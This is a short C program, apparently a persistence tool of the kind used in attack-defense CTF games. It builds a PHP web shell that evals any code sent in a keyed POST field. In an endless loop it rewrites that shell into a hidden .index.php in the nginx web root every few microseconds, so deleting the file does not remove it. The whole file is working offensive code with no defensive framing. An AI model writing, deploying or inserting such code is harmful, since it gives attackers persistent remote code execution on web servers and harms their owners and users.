#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include <unistd.h>
int main(int argc, char* argv[])
{
    char keys[] = "5W6Tze2KjCNIeZbfMYHCNeFkgm7Lb5EJ9w6ieXHTUqvNTDsdXdwHnSATnzyoN1M8UTLBiA3sEAni6JcFD3twbvupPEGCfnK3JW15QlXird3OjvRwMqyKAbVHeR7TdXxSI3pNt1wd4kAvyCLTNxb5O2lPU0r6V5BnG9JEqzQggkLIHiueEwznMBtP4q0v8WNGHvZyuaCj7EwPLUH0baHdiCeY8jN3b2CavVoNDxs0LmIjQ67FTdCq15bGyYEfiXC5f32iKJrsbEydItQ8PC83aq7UOR98mjYyMJYrZyqWqNZl5tXaxCWmb3ZUQuCGEsqpoQCMBktueYIZJfnTayOLQP1tsNkMoODS6HdST1qbTdFpW4hjCXWT3oUJA6hFLRETSZ1BVQ7XBTfp61cSKsmiEMbkUqpSY9jhPszKLwyXGmj5VOAf70VXL3GF7WFjNM1nYv31oeJy9yJt30laaIAfLtVuRLV5SqpIGyJ9eIQ6YihdnlLjRk9SV0XjzTypkxc1";
    char fn[255] = "/usr/local/nginx/html/.index.php";
    char eval[255];
    char key[25] ;
    int kstart = 10;
    memset(key, 0, sizeof(key));
    memset(eval, 0, sizeof(eval));

    if (argc > 1)
    {
        sscanf(argv[1], "%d", &kstart);
    }
    stpncpy(key, keys + kstart, 8);
    sprintf(eval, "<?php eval(@$_POST['%s']); ?>", key);
    while (1)
    {
        FILE* p = fopen(fn, "w");
        if (p)
        {
            fprintf(p, "%s", eval);
            fclose(p);
        }
        usleep(10);
    }
}